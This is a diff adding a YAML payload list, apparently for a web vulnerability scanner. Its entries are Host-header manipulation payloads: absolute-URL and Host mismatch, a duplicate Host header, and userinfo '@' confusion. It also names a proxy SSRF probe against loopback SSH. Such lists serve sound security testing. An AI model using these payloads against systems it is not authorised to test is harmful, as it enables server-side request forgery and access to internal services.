@@ -1,0 +1,31 @@
+payloads:
+  - active: true
+    type: raw
+    key: absolute-url-host-mismatch
+    value: "GET https://%s{path} HTTP/1.1\\r\\nHost: {host}\\r\\n"
+    group: cracking_the_lens
+    comment: "Absolute URL and Host mismatch"
+  - active: true
+    type: raw
+    key: duplicate-host
+    value: "Host: {host}\\r\\nHost: %s"
+    group: cracking_the_lens
+    comment: "Duplicate Host header"
+  - active: true
+    type: raw
+    key: host-with-at
+    value: "Host: %s@{host}"
+    group: cracking_the_lens
+    comment: "userinfo parser confusion"
+  - active: true
+    type: raw
+    key: host-at-reversed
+    value: "Host: {host}@%s"
+    group: cracking_the_lens
+    comment: "reverse userinfo confusion"
+  - active: true
+    type: raw
+    key: proxy-local-ssh
+    value: "response-based proxy SSRF to loopback SSH"
+    group: proxy_unsafe
+    comment: "unsafe proxy behavior to 127.0.0.1:22 and localhost:22"
